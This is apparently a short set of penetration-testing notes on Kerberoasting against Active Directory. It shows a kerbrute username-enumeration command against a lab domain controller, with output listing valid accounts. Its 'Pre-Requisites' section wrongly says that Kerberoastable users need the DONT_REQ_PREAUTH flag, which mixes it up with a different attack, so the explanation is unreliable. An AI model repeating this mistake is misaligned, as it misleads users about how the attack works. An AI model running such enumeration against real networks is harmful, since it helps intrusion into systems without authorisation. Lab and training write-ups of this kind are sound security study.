# Kerberoasting

Kerberoasting is a type of attack against Microsoft Active Directory environments that involves extracting service account passwords from Kerberos tickets. Service accounts are often used to run automated processes and scheduled tasks, and because they often have high privileges within an organization, they can be a valuable target for attackers.

The basic method of kerberoasting involves requesting a ticket for a service account, then cracking the encrypted password hash that is included in the ticket.

# Pre-Requisites

Kerberoastable users need to have the 'DONT_REQ_PREAUTH' flag set.

``` 
$   kerbrute userenum -d MCDONALDS.LOCAL SecLists/Usernames/xato-net-10-million-usernames.txt --dc dc-01.htb                                                            


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/08/23 - Ronnie Flathers @ropnop

2023/02/08 14:26:09 >  Using KDC(s):
2023/02/08 14:26:09 >   10.10.10.175:88

2023/02/08 14:26:45 >  [+] VALID USERNAME:       administrator@MCDONALDS.LOCAL
2023/02/08 14:30:08 >  [+] VALID USERNAME:       dudi@MCDONALDS.LOCAL
2023/02/08 14:30:32 >  [+] VALID USERNAME:       sagi@MCDONALDS.LOCAL
2023/02/08 14:31:49 >  [+] VALID USERNAME:       ido@MCDONALDS.LOCAL
2023/02/08 14:48:58 >  [+] VALID USERNAME:       overlord@MCDONALDS.LOCAL
